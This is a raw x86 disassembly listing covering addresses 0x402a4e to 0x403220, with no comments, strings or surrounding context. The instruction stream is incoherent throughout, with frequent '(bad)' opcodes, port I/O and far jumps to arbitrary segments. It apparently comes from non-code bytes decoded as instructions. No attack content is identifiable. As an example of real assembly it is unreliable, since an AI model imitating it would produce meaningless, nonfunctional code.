  402a4e:	in     eax,0x42
  402a50:	xchg   BYTE PTR [edi+0x2553e608],bh
  402a56:	xchg   esp,eax
  402a57:	jb     0x402ab9
  402a59:	dec    edi
  402a5a:	rol    BYTE PTR [eax],0x89
  402a5d:	mov    ds:0x772f4817,eax
  402a62:	mov    ecx,0xe4788669
  402a67:	or     al,0x81
  402a69:	addr16 inc esp
  402a6b:	jecxz  0x402ab1
  402a6d:	jp     0x402ae7
  402a6f:	push   cs
  402a70:	mov    ebp,0xd7d4c58e
  402a75:	fisttp DWORD PTR [eax+0x4f]
  402a78:	and    bh,BYTE PTR ss:[ecx-0x2ffce9bd]
  402a7f:	sbb    eax,0x3cdffbe8
  402a84:	fild   QWORD PTR [edi+0x36d9f5d8]
  402a8a:	add    DWORD PTR [edx],esp
  402a8c:	mov    ds:0x4ba18a29,eax
  402a91:	daa    
  402a92:	ficom  DWORD PTR [ecx+0x50b3d563]
  402a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a99:	ins    DWORD PTR es:[edi],dx
  402a9a:	jo     0x402a75
  402a9c:	mov    cl,0x3
  402a9e:	cmp    DWORD PTR [ebp+0x1995404f],ebx
  402aa4:	int    0xdf
  402aa6:	push   ds
  402aa7:	mov    bl,BYTE PTR [esi]
  402aa9:	lahf   
  402aaa:	outs   dx,DWORD PTR ds:[esi]
  402aab:	popaw  
  402aad:	js     0x402ae2
  402aaf:	pop    es
  402ab0:	push   ds
  402ab1:	jge    0x402abe
  402ab3:	cs push 0xfffffff7
  402ab6:	test   al,0x6
  402ab8:	pushf  
  402ab9:	fisub  DWORD PTR [ebp+edx*2+0x3454e113]
  402ac0:	xor    BYTE PTR [edx-0x34],ch
  402ac3:	iret   
  402ac4:	add    dh,al
  402ac6:	adc    dl,BYTE PTR [ebx+0x36111001]
  402acc:	int3   
  402acd:	pusha  
  402ace:	jb     0x402acf
  402ad0:	imul   esp,DWORD PTR ds:0xdce4de4e,0xffffffd9
  402ad7:	in     al,0xe2
  402ad9:	mov    ah,0xd2
  402adb:	loope  0x402b2c
  402add:	xchg   ebx,eax
  402ade:	add    bh,0x52
  402ae1:	mov    ah,0x19
  402ae4:	xchg   esi,eax
  402ae5:	in     al,0xe
  402ae7:	in     al,dx
  402ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ae9:	mov    edi,0x91dfb7ee
  402aee:	jle    0x402aa9
  402af0:	stos   DWORD PTR es:[edi],eax
  402af1:	movzx  edx,BYTE PTR [edi+eax*4+0x2019f20c]
  402af9:	sar    dl,1
  402afb:	sbb    al,0x44
  402afd:	in     al,dx
  402afe:	(bad)  
  402aff:	pop    ds
  402b00:	mov    edx,0x8a274775
  402b05:	das    
  402b06:	inc    edx
  402b07:	inc    edi
  402b08:	jmp    0xda8a42ed
  402b0d:	je     0x402aa8
  402b0f:	cmp    DWORD PTR [eax+0x1f],0x36
  402b13:	adc    DWORD PTR [ecx+0x121d8331],esp
  402b19:	ret    0x8d7a
  402b1c:	ins    BYTE PTR es:[edi],dx
  402b1d:	mov    esi,0x62db85cb
  402b22:	out    dx,eax
  402b23:	pop    ds
  402b24:	and    eax,0xa2b67f1b
  402b29:	mov    edx,cs
  402b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b2c:	xor    eax,0xc82efa8c
  402b31:	int    0xf5
  402b33:	mov    es,WORD PTR [ebx]
  402b35:	test   al,0xd7
  402b37:	xchg   edi,eax
  402b38:	push   ecx
  402b39:	je     0xf9519dfe
  402b3f:	dec    edx
  402b40:	clc    
  402b41:	dec    ecx
  402b42:	and    ah,cl
  402b44:	inc    ebp
  402b45:	mov    WORD PTR [ebx+0x1b],?
  402b48:	cwde   
  402b49:	rcl    DWORD PTR [ecx+ecx*8-0x77],0x96
  402b4e:	icebp  
  402b4f:	push   cs
  402b50:	ret    
  402b51:	push   eax
  402b52:	xchg   ecx,eax
  402b53:	aaa    
  402b54:	adc    eax,0x2a6d02c6
  402b59:	jecxz  0x402b34
  402b5b:	mov    ebx,0x5271e3e8
  402b60:	es mov bh,0xc6
  402b63:	ins    DWORD PTR es:[edi],dx
  402b64:	fnstcw WORD PTR [edx-0x49]
  402b67:	dec    ebp
  402b68:	mov    dh,BYTE PTR [edx-0x5a]
  402b6b:	xor    DWORD PTR [ebx-0x51],0x508d396
  402b72:	fisttp WORD PTR [ebx+0x63]
  402b75:	dec    edi
  402b76:	cmp    eax,0x6aa61d38
  402b7b:	pop    ds
  402b7c:	xchg   ecx,eax
  402b7d:	mov    al,0xee
  402b7f:	and    dl,0x7f
  402b82:	cmc    
  402b83:	jl     0x402b3b
  402b85:	test   ah,cl
  402b87:	int    0x47
  402b89:	popf   
  402b8a:	scas   al,BYTE PTR es:[edi]
  402b8b:	scas   eax,DWORD PTR es:[di]
  402b8d:	repz add al,0x89
  402b90:	xchg   ebx,eax
  402b91:	mov    edi,0x8bbd73a6
  402b96:	push   edi
  402b97:	adc    ebp,DWORD PTR ds:0x8bd37707
  402b9d:	xlat   BYTE PTR ds:[ebx]
  402b9e:	inc    esi
  402b9f:	scas   al,BYTE PTR es:[edi]
  402ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ba1:	sahf   
  402ba2:	xor    BYTE PTR [ecx],cl
  402ba4:	frstor [esi]
  402ba6:	mov    ebp,DWORD PTR [esi+0xb]
  402ba9:	popa   
  402baa:	xchg   ecx,eax
  402bab:	sbb    al,0x32
  402bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bae:	mov    DWORD PTR [edx+0x6e],ebx
  402bb1:	outs   dx,DWORD PTR ds:[esi]
  402bb2:	mov    al,BYTE PTR [edx]
  402bb4:	mov    esp,0xffd8aea6
  402bb9:	push   ss
  402bba:	mov    bl,BYTE PTR [esi+0x5fe081f5]
  402bc0:	jg     0x402c16
  402bc2:	sbb    eax,0x1a595c60
  402bc7:	lea    ecx,[edi+0x24b44bdd]
  402bcd:	sbb    BYTE PTR [ebx+0x34],dh
  402bd0:	add    eax,DWORD PTR [ebx]
  402bd2:	and    dl,dh
  402bd4:	jnp    0x402bfb
  402bd6:	imul   ecx,DWORD PTR [esi-0x5fac3ada],0xffffffbe
  402bdd:	sbb    ebp,DWORD PTR [ebx+0x47ad3c]
  402be3:	inc    esi
  402be4:	add    eax,0x74f34fe9
  402be9:	ds sbb eax,0x8cabf0b
  402bef:	adc    esp,0xd329949b
  402bf5:	in     eax,0x7
  402bf7:	cdq    
  402bf8:	xor    DWORD PTR [eax-0x4e47e717],edi
  402bfe:	and    edx,ebp
  402c00:	retf   0xb27e
  402c03:	out    dx,ax
  402c05:	mov    ds:0x742ba5e6,al
  402c0a:	enter  0xbfa0,0x8b
  402c0e:	nop
  402c0f:	pop    edx
  402c10:	lods   eax,DWORD PTR ds:[esi]
  402c11:	xor    al,0x7e
  402c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c15:	mov    eax,ds:0xc5095229
  402c1a:	jecxz  0x402c75
  402c1c:	pop    ds
  402c1d:	pushf  
  402c1e:	pop    es
  402c1f:	dec    esp
  402c20:	ror    BYTE PTR [edi+edx*1+0x3208b328],0xfd
  402c28:	sub    ebx,DWORD PTR [ebx+ebx*2]
  402c2b:	xlat   BYTE PTR ds:[ebx]
  402c2c:	fstp   DWORD PTR fs:[eax-0x61]
  402c30:	scas   al,BYTE PTR es:[edi]
  402c31:	int    0xe4
  402c33:	mov    edx,0xe2c3c000
  402c38:	leave  
  402c39:	and    BYTE PTR [ebx-0x64],ch
  402c3c:	sahf   
  402c3d:	leave  
  402c3e:	cmp    BYTE PTR [ebp+0x46],dh
  402c41:	and    al,0xcf
  402c43:	push   esp
  402c44:	rcr    BYTE PTR [ecx+0x26],0x68
  402c48:	add    cl,al
  402c4a:	mov    edx,0xa760f61f
  402c4f:	sub    al,0x30
  402c51:	mov    ax,0x2cd2
  402c55:	out    dx,al
  402c56:	mov    al,ds:0x85e1ab8
  402c5b:	stos   DWORD PTR es:[edi],eax
  402c5c:	(bad)  
  402c5d:	mov    DWORD PTR [esi-0x44],ecx
  402c60:	lahf   
  402c61:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  402c63:	pop    esp
  402c64:	cli    
  402c65:	ja     0x402c38
  402c67:	dec    esi
  402c68:	mov    esp,0xa04ea281
  402c6d:	dec    DWORD PTR [ebx-0x314b545d]
  402c73:	(bad)  
  402c74:	out    0x9d,eax
  402c76:	in     al,0xe0
  402c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c79:	mov    DWORD PTR [esi-0x5],ecx
  402c7c:	pop    ds
  402c7d:	(bad)  
  402c7e:	pop    ds
  402c7f:	mov    eax,0x52cd79c7
  402c84:	mov    ecx,0xf101720b
  402c89:	jmp    0x955e:0xd391815e
  402c90:	in     eax,dx
  402c91:	call   0xaf8:0x21574f30
  402c98:	jmp    0x402ce4
  402c9a:	pop    ds
  402c9b:	scas   al,BYTE PTR es:[edi]
  402c9c:	popa   
  402c9d:	mov    esp,0x8c4f76d
  402ca2:	jbe    0x402cc6
  402ca4:	pushf  
  402ca5:	mov    esi,0xe9010a38
  402caa:	and    DWORD PTR ds:0x4d28463e,ebx
  402cb0:	clc    
  402cb1:	ins    DWORD PTR es:[edi],dx
  402cb2:	mov    ebx,0xbb5004d3
  402cb7:	leave  
  402cb8:	pop    eax
  402cb9:	push   esp
  402cba:	test   DWORD PTR [eax-0x4e93d760],edi
  402cc0:	and    eax,0x394da144
  402cc5:	xchg   esi,edx
  402cc7:	mov    ds:0xdc68619b,eax
  402ccc:	aam    0x8d
  402cce:	dec    esi
  402ccf:	imul   edx,DWORD PTR [ebp-0x2],0x4a1b5839
  402cd6:	push   es
  402cd7:	xchg   ebx,eax
  402cd8:	lds    edx,FWORD PTR ss:[eax]
  402cdb:	(bad)
  402cdf:	mov    BYTE PTR [ebp+0x132f174b],ch
  402ce5:	sbb    DWORD PTR [edx],ebx
  402ce7:	aad    0x18
  402ce9:	mov    esi,0xf338373a
  402cee:	fimul  DWORD PTR [ebx-0x7e92cb52]
  402cf4:	sub    ebp,DWORD PTR [eax-0x234bae6a]
  402cfa:	call   0x17a7:0xae2fa56b
  402d01:	or     esp,DWORD PTR [ebx]
  402d03:	scas   al,BYTE PTR es:[edi]
  402d04:	adc    DWORD PTR [ebp+edi*4+0x5fc3bd],esp
  402d0b:	cmc    
  402d0c:	mov    bl,0xb
  402d0e:	das    
  402d0f:	jp     0x402d61
  402d11:	iret   
  402d12:	call   0x1aca4fb1
  402d17:	retf   0x40dd
  402d1a:	mov    ch,0xa7
  402d1c:	adc    ebp,DWORD PTR [edx-0x2e]
  402d1f:	and    al,BYTE PTR [edx]
  402d21:	(bad)  
  402d23:	imul   edi,DWORD PTR [edx],0xfac2e58
  402d29:	cld    
  402d2a:	loop   0x402d8a
  402d2c:	std    
  402d2d:	imul   esi,DWORD PTR [edi],0xca223d4d
  402d33:	jmp    0xff16dc91
  402d38:	xchg   esp,eax
  402d39:	jne    0x402d29
  402d3b:	int    0x41
  402d3d:	jmp    0x402d8f
  402d3f:	cs pop esi
  402d41:	subps  xmm5,XMMWORD PTR [esi+0x15edb49]
  402d48:	mov    esp,0x4b4c8a62
  402d4d:	xor    eax,0xd5d55e6
  402d52:	cld    
  402d53:	aad    0x7d
  402d55:	add    DWORD PTR ds:0xd53314b4,edx
  402d5b:	fs and al,0x3
  402d5e:	in     eax,dx
  402d5f:	xchg   edx,eax
  402d60:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  402d62:	sbb    al,BYTE PTR [ecx]
  402d64:	pop    eax
  402d65:	loopne 0x402cec
  402d67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d68:	repnz cmc 
  402d6a:	dec    eax
  402d6b:	mov    al,ds:0x88984faf
  402d70:	pop    ebp
  402d71:	imul   eax,DWORD PTR [edi+0x33e9b833],0x9db5e278
  402d7b:	in     eax,dx
  402d7c:	leave  
  402d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d7e:	lock lahf 
  402d80:	and    DWORD PTR [esi-0x2772a341],esp
  402d86:	mov    ah,0x4d
  402d88:	pop    ebp
  402d89:	inc    esi
  402d8a:	mov    al,0x83
  402d8c:	mov    DWORD PTR [ebx],edx
  402d8e:	mov    al,0x8b
  402d90:	mov    al,ds:0x9894f983
  402d95:	fdivr  DWORD PTR [ebx+ecx*4]
  402d98:	popf   
  402d99:	jbe    0x402d5b
  402d9b:	gs shl ecx,cl
  402d9e:	add    ecx,esp
  402da0:	mov    esi,0x5bd06009
  402da5:	fld    DWORD PTR [ecx-0x26]
  402da8:	(bad)  
  402da9:	sbb    BYTE PTR [eax+esi*2+0x64],dl
  402dad:	xchg   edx,eax
  402dae:	mov    DWORD PTR [esi+0x18da5245],edi
  402db4:	(bad)  
  402db5:	mov    esi,0xb833305c
  402dba:	jge    0x402de1
  402dbc:	cmp    DWORD PTR [edx+0x1a],edx
  402dbf:	or     bh,BYTE PTR [eax]
  402dc1:	les    esp,FWORD PTR [eax+0x54]
  402dc4:	retf   0xe0fc
  402dc7:	sbb    edx,DWORD PTR [ecx]
  402dc9:	and    al,0x7
  402dcb:	xchg   ebp,eax
  402dcc:	(bad)  
  402dcd:	div    al
  402dcf:	jle    0x402d56
  402dd1:	(bad)  
  402dd2:	retf   
  402dd3:	int    0x30
  402dd5:	in     al,dx
  402dd6:	jo     0x402d9d
  402dd8:	xor    BYTE PTR [ecx],ch
  402dda:	and    edx,DWORD PTR [eax-0x595ce8d5]
  402de0:	rcr    DWORD PTR [edi+ebx*1-0x35],1
  402de4:	nop
  402de5:	shr    DWORD PTR [esp+ebp*4+0x5a],cl
  402de9:	ret    
  402dea:	ret    
  402deb:	and    ch,BYTE PTR [ecx+0x5779939]
  402df1:	pushf  
  402df2:	sub    DWORD PTR [ecx-0x6779e902],ebp
  402df8:	dec    edx
  402df9:	inc    DWORD PTR [edx]
  402dfb:	cmp    al,0x64
  402dfd:	add    al,0x97
  402dff:	sbb    ah,BYTE PTR [esi+0xd]
  402e02:	xchg   ebx,eax
  402e03:	inc    edi
  402e04:	or     DWORD PTR [edx-0x30],0xffffff89
  402e08:	aad    0xf4
  402e0a:	or     DWORD PTR [edx+0x65],esp
  402e0d:	push   edi
  402e0e:	popf   
  402e0f:	sub    cl,al
  402e11:	and    bh,0xd9
  402e14:	push   edi
  402e15:	xchg   ebx,eax
  402e16:	fld    DWORD PTR [ecx+0x9]
  402e19:	inc    eax
  402e1a:	mov    ds:0xf0d6c65,eax
  402e1f:	add    al,0xd1
  402e21:	ss (bad) 
  402e23:	xchg   esi,eax
  402e24:	dec    ecx
  402e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e26:	(bad)
  402e29:	sbb    dl,al
  402e2b:	test   BYTE PTR [ebx+0x7ca18720],0xfb
  402e32:	and    al,0x2a
  402e34:	cwde   
  402e35:	outs   dx,DWORD PTR ds:[esi]
  402e36:	cmp    dl,al
  402e38:	sti    
  402e39:	test   eax,0xd22d51bb
  402e3e:	test   eax,0xa5e771c4
  402e43:	test   al,0x22
  402e45:	nop
  402e46:	jmp    0x9f09:0xb3435ab
  402e4d:	xchg   bl,al
  402e4f:	jne    0x402e34
  402e51:	push   ecx
  402e52:	lods   eax,DWORD PTR ds:[esi]
  402e53:	jnp    0x402ed3
  402e55:	inc    edx
  402e56:	dec    edx
  402e57:	pop    ds
  402e58:	sub    eax,0xc86ec88e
  402e5d:	cmp    BYTE PTR [eax-0x6a289f6a],0x3
  402e64:	jno    0x402eba
  402e66:	mov    esp,0x9febcb13
  402e6b:	in     al,dx
  402e6c:	out    dx,eax
  402e6d:	sahf   
  402e6e:	add    DWORD PTR [edx+0x28],esi
  402e71:	jnp    0x402e0d
  402e73:	push   edx
  402e74:	stos   DWORD PTR es:[edi],eax
  402e75:	sub    DWORD PTR [edi+0x1cce1ada],0xbba83869
  402e7f:	add    ebx,DWORD PTR [edi+0x75476a17]
  402e85:	loope  0x402e98
  402e87:	mov    eax,ds:0x71a2422c
  402e8c:	pop    edx
  402e8d:	sar    DWORD PTR [eax+ebx*2-0x52d813c8],0x86
  402e95:	fsubr  DWORD PTR [ecx+edx*1]
  402e98:	aam    0x4a
  402e9a:	nop
  402e9b:	test   DWORD PTR [edi-0x64ef389a],0x2ed7abf
  402ea5:	dec    edi
  402ea6:	mov    WORD PTR [edi-0x64],?
  402ea9:	lea    edi,[edx]
  402eab:	gs ja  0x402ea3
  402eae:	(bad)  
  402eaf:	pop    ecx
  402eb0:	idiv   DWORD PTR [ebp+0x1]
  402eb3:	and    ah,BYTE PTR [ecx+0x2f7cf822]
  402eb9:	or     al,0xe0
  402ebb:	add    bl,BYTE PTR [edi-0x707b7678]
  402ec1:	and    al,0x8d
  402ec3:	jb     0x402e6f
  402ec5:	inc    esi
  402ec6:	push   es
  402ec7:	leave  
  402ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ec9:	pushf  
  402eca:	add    esp,edi
  402ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ecd:	or     eax,0xe6598fde
  402ed2:	pop    esp
  402ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ed4:	mov    al,ds:0x85544c7e
  402ed9:	mov    ecx,DWORD PTR [ebx+0x7ed36cda]
  402edf:	and    BYTE PTR [edx-0xf],al
  402ee2:	dec    ecx
  402ee3:	push   eax
  402ee4:	and    cl,BYTE PTR [ebx+esi*4-0xab128c9]
  402eeb:	(bad)  
  402eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eed:	or     dh,BYTE PTR [ecx+0x5c]
  402ef0:	ss in  eax,0xc6
  402ef3:	dec    eax
  402ef4:	mov    eax,ds:0x90fb0252
  402ef9:	call   0xf7e0:0x498ac849
  402f00:	jmp    FWORD PTR [edi]
  402f02:	xchg   BYTE PTR ds:[ecx+0x16],bh
  402f06:	push   ss
  402f07:	xchg   edx,eax
  402f08:	or     al,0x75
  402f0a:	test   al,0x2c
  402f0c:	nop
  402f0d:	xor    eax,0x65a189ba
  402f12:	ins    DWORD PTR es:[edi],dx
  402f13:	xlat   BYTE PTR ds:[ebx]
  402f14:	js     0x402f94
  402f16:	daa    
  402f17:	dec    ecx
  402f18:	fs mov ebp,0x95f51c58
  402f1e:	repnz mov cl,0x2
  402f21:	sbb    eax,0xee2ac591
  402f26:	dec    ebx
  402f27:	sub    eax,0x733ce7a5
  402f2c:	inc    ebx
  402f2d:	imul   esi,DWORD PTR [esp+eiz*2+0x341aa800],0xe56f8066
  402f38:	pop    es
  402f39:	retf   
  402f3a:	push   edx
  402f3b:	jg     0x402f63
  402f3d:	or     DWORD PTR [edx],edx
  402f3f:	jbe    0x402f6c
  402f41:	mov    al,ds:0xe7f38e76
  402f46:	test   al,0xf2
  402f49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f4a:	dec    ebp
  402f4b:	hlt    
  402f4c:	or     DWORD PTR [edi-0x21b0abdb],ebp
  402f52:	sub    DWORD PTR [edi+0x69f472fd],esi
  402f58:	xor    dh,BYTE PTR [edx-0x61]
  402f5b:	dec    eax
  402f5c:	(bad)  
  402f5e:	jmp    0x6ee1:0xfd79341
  402f65:	dec    edx
  402f66:	inc    ecx
  402f67:	in     eax,0xe1
  402f69:	jb     0x402f1e
  402f6b:	out    0x6f,eax
  402f6d:	pushf  
  402f6e:	rep lods al,BYTE PTR ds:[esi]
  402f70:	shl    DWORD PTR [esi-0x3eaa42dc],0x23
  402f77:	cmp    DWORD PTR [ebp+0x1a],edx
  402f7a:	adc    al,0xa
  402f7c:	or     BYTE PTR [bp+0x2f8a],dl
  402f81:	sbb    edx,DWORD PTR [edi+0x1cf46c65]
  402f87:	in     al,dx
  402f88:	dec    ebx
  402f89:	aaa    
  402f8a:	and    DWORD PTR [ecx],ebp
  402f8c:	push   esi
  402f8d:	push   eax
  402f8e:	sti    
  402f8f:	add    ah,dl
  402f91:	fist   WORD PTR [edx-0x188811a4]
  402f97:	ja     0x402f81
  402f99:	icebp  
  402f9a:	dec    esi
  402f9b:	fcomp  DWORD PTR [edx]
  402f9d:	xchg   BYTE PTR [esi],cl
  402f9f:	loopne 0x402f39
  402fa1:	adc    edx,0x35
  402fa4:	push   ecx
  402fa5:	outs   dx,DWORD PTR ds:[esi]
  402fa6:	int    0xf3
  402fa8:	mov    eax,DWORD PTR [edi+0x56]
  402fab:	xchg   DWORD PTR ds:0x77556bc7,eax
  402fb1:	xchg   esp,eax
  402fb2:	aad    0x84
  402fb4:	stos   BYTE PTR es:[edi],al
  402fb5:	and    bl,BYTE PTR [edi+edx*2]
  402fb8:	loop   0x402fb5
  402fba:	add    BYTE PTR [ebx+ebp*1-0x24],0x6
  402fbf:	push   ds
  402fc0:	add    eax,0x953795e9
  402fc5:	clc    
  402fc6:	call   0xb70e:0xb7becb82
  402fcd:	jb     0x402f93
  402fcf:	repnz sbb al,0xf3
  402fd2:	sti    
  402fd3:	dec    ecx
  402fd4:	push   ecx
  402fd5:	outs   dx,DWORD PTR ds:[esi]
  402fd6:	les    esi,FWORD PTR [esp+edi*2+0x6ef08c3e]
  402fdd:	mov    bl,0xdb
  402fdf:	and    BYTE PTR [ebx-0x76a99fa4],0x6e
  402fe6:	ins    BYTE PTR es:[edi],dx
  402fe7:	xlat   BYTE PTR ds:[ebx]
  402fe8:	or     DWORD PTR [ecx-0x46b7e1fd],ecx
  402fee:	rol    DWORD PTR [edi-0x113b176a],1
  402ff4:	and    dl,BYTE PTR [eax-0x5c]
  402ff7:	pop    edi
  402ff8:	sahf   
  402ff9:	lds    esi,FWORD PTR [ebx-0x7c]
  402ffc:	ja     0x402f90
  402ffe:	xor    dh,BYTE PTR [eax-0x4ec51be7]
  403004:	mov    dl,0x49
  403006:	in     eax,dx
  403007:	xchg   ebp,eax
  403008:	(bad)  
  40300a:	stos   BYTE PTR es:[edi],al
  40300b:	adc    DWORD PTR [edx+0x5259053e],ebp
  403011:	sbb    bl,ah
  403013:	jno    0x40300c
  403015:	data16 in al,0xcd
  403018:	(bad)  [ecx]
  40301a:	cmovp  ebp,DWORD PTR [ebp+0x66]
  40301e:	adc    BYTE PTR [ebx+0x738521dc],0x6d
  403025:	hlt    
  403026:	repz cmp DWORD PTR [ebx-0x588f859f],ebp
  40302d:	mov    al,0x8f
  40302f:	jl     0x402fda
  403031:	jbe    0x403070
  403033:	daa    
  403034:	pop    eax
  403035:	and    al,0x3c
  403037:	(bad)  
  403038:	fcom   DWORD PTR ds:0x34ebfe94
  40303e:	pop    ecx
  40303f:	adc    eax,0xb167d6f4
  403044:	pop    edi
  403045:	xchg   esi,eax
  403046:	mov    ?,WORD PTR [ebp+0x63]
  403049:	aad    0xa2
  40304b:	fistp  WORD PTR [esi+edx*4+0x79]
  40304f:	das    
  403050:	push   0x26971c6b
  403055:	out    dx,eax
  403056:	enter  0xa2cb,0xd8
  40305a:	xor    edi,eax
  40305c:	or     BYTE PTR [edx-0x2a],0x9e
  403060:	push   0xffffffbb
  403062:	add    al,0xf8
  403064:	fsub   st(3),st
  403066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403067:	and    DWORD PTR [edi-0x58c82906],ebx
  40306d:	repz jmp 0xd22362b7
  403073:	push   0x19
  403075:	sahf   
  403076:	leave  
  403077:	test   BYTE PTR [ebp+0x42],dl
  40307a:	push   ds
  40307b:	xchg   esi,eax
  40307c:	mov    BYTE PTR ds:0x9d8ceef,al
  403082:	push   ebp
  403083:	fiadd  DWORD PTR [ebx+eax*4-0x20305769]
  40308a:	push   ds
  40308b:	mov    ?,eax
  40308d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40308e:	rcl    DWORD PTR [ecx+0x5f4957f6],0x2d
  403095:	push   0xffffffe2
  403097:	xchg   edi,eax
  403098:	mov    ecx,0xf9fb91e8
  40309d:	pop    edi
  40309e:	pop    ds
  40309f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030a0:	or     dl,BYTE PTR [ebx-0x2277043c]
  4030a6:	and    edx,DWORD PTR [eax-0x7e9660eb]
  4030ac:	xchg   esp,eax
  4030ad:	jmp    0x4af225b8
  4030b2:	dec    eax
  4030b3:	sub    eax,0xe52f075b
  4030b8:	sbb    BYTE PTR [eax+0x5d],ch
  4030bb:	inc    ebx
  4030bc:	adc    DWORD PTR [eax+ecx*8],edx
  4030bf:	lods   al,BYTE PTR ds:[esi]
  4030c0:	inc    ebx
  4030c1:	mov    edx,0x89dac21f
  4030c6:	out    dx,eax
  4030c7:	in     eax,0x27
  4030c9:	jmp    0x4030f9
  4030cb:	cmp    eax,0x95b8c949
  4030d0:	add    dh,bh
  4030d2:	les    ecx,FWORD PTR [ecx+0x4d]
  4030d5:	fnstsw WORD PTR [ebx-0x49]
  4030d8:	push   ss
  4030d9:	call   0x7773e548
  4030de:	sbb    bl,bh
  4030e0:	mov    eax,ds:0xfabd43b5
  4030e5:	mov    esp,0x1244618f
  4030ea:	ins    DWORD PTR es:[edi],dx
  4030eb:	(bad)  
  4030ec:	adc    edx,esp
  4030ee:	aas    
  4030ef:	(bad)  
  4030f1:	clc    
  4030f2:	(bad)  
  4030f3:	fdiv   QWORD PTR [ecx]
  4030f5:	test   ebx,esp
  4030f7:	stos   BYTE PTR es:[edi],al
  4030f8:	in     eax,dx
  4030f9:	jmp    0x890d8969
  4030fe:	adc    esp,DWORD PTR [eax+0x50ad01de]
  403104:	in     al,0x48
  403106:	dec    edx
  403107:	xchg   DWORD PTR [esi+0x14b2481a],ecx
  40310d:	mov    dl,0xa0
  40310f:	outs   dx,BYTE PTR ds:[esi]
  403110:	das    
  403111:	jge    0x403188
  403113:	inc    esp
  403114:	inc    esi
  403115:	or     DWORD PTR [ecx],edx
  403117:	(bad)  
  403118:	sahf   
  403119:	or     al,0x5e
  40311b:	ret    
  40311c:	xchg   esp,eax
  40311d:	mov    bl,BYTE PTR [esi]
  40311f:	arpl   WORD PTR [ecx+eax*1-0x54086c4b],dx
  403126:	pminub mm2,QWORD PTR [edx+0x1f]
  40312a:	mov    WORD PTR [edx+ebx*1+0x55],ds
  40312e:	push   ebx
  40312f:	push   0x63c7d269
  403134:	xchg   BYTE PTR [esi-0x4549ff04],bh
  40313a:	inc    esi
  40313b:	ret    0x9f4
  40313e:	aam    0x13
  403140:	lea    ebp,[ebp-0x69]
  403143:	pusha  
  403144:	inc    esp
  403145:	cmp    edx,eax
  403147:	mov    ah,0x53
  403149:	mov    edi,0x8e75fae4
  40314e:	add    eax,0xfa7e2377
  403153:	add    al,0x13
  403155:	inc    ebp
  403156:	sahf   
  403157:	mov    ebp,0xf051b2c7
  40315c:	cmc    
  40315d:	adc    DWORD PTR [ebx+0x29889d73],esp
  403163:	ss test eax,0x8df2c182
  403169:	pop    eax
  40316a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40316b:	sbb    al,0x31
  40316d:	xchg   edi,eax
  40316e:	jae    0x403134
  403170:	fidivr WORD PTR [edx+0x32]
  403173:	dec    esi
  403174:	cwde   
  403175:	or     DWORD PTR ds:0xbcee252e,esp
  40317b:	and    eax,0x960e8edb
  403180:	xchg   esp,eax
  403181:	dec    eax
  403182:	jns    0x40316d
  403184:	inc    edi
  403185:	popa   
  403186:	push   edx
  403187:	xor    DWORD PTR [eax+edi*8-0x5b],edi
  40318b:	jno    0x403138
  40318d:	mov    ebx,0xdf96b203
  403192:	icebp  
  403193:	call   0x26d:0x7a0dbba0
  40319a:	(bad)  
  40319b:	pushf  
  40319c:	push   esi
  40319d:	out    0x97,eax
  40319f:	cli    
  4031a0:	ins    BYTE PTR es:[edi],dx
  4031a1:	inc    eax
  4031a2:	sti    
  4031a3:	mov    eax,0x8d782b3c
  4031a8:	add    esp,0x64ef847f
  4031ae:	pop    eax
  4031af:	mov    ah,0x12
  4031b1:	and    ch,BYTE PTR [esi-0x699af913]
  4031b7:	sbb    ecx,DWORD PTR [ebx+ecx*8]
  4031ba:	loopne 0x40317b
  4031bc:	xchg   ebp,eax
  4031bd:	mov    dh,0x1b
  4031bf:	mov    al,0xea
  4031c1:	push   edx
  4031c2:	cdq    
  4031c3:	inc    ecx
  4031c4:	sbb    BYTE PTR [esp+esi*1],al
  4031c7:	push   cs
  4031c8:	push   ebx
  4031c9:	ja     0x4031cb
  4031cb:	out    dx,eax
  4031cc:	mov    edx,0x93eecd42
  4031d1:	enter  0x3cbd,0x8c
  4031d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031d6:	aas    
  4031d7:	xchg   ecx,eax
  4031d8:	inc    ebp
  4031d9:	mov    esi,0x7a95c9e7
  4031de:	daa    
  4031df:	call   FWORD PTR [esi-0x5f0a5e1f]
  4031e5:	cmc    
  4031e6:	outs   dx,BYTE PTR ds:[esi]
  4031e7:	mov    bl,ch
  4031e9:	loopne 0x4031fc
  4031eb:	dec    esi
  4031ec:	push   0xffffffad
  4031ee:	mov    ebx,0xf897024e
  4031f3:	call   0x34740f5e
  4031f8:	cmp    BYTE PTR [edx-0x3b0b6f1c],cl
  4031fe:	test   BYTE PTR [eax],0x2d
  403201:	jbe    0x403207
  403203:	loop   0x4031dc
  403205:	cmp    BYTE PTR [edi+0x75],ah
  403208:	push   eax
  403209:	pushf  
  40320a:	daa    
  40320b:	dec    esi
  40320c:	lods   al,BYTE PTR ds:[esi]
  40320d:	shl    DWORD PTR [edx+0x2e2b11ad],cl
  403213:	jge    0x403215
  403215:	cmp    BYTE PTR [edx-0x2476e83],bl
  40321b:	add    eax,0xf468ec
  403220:	es sub edi,edi
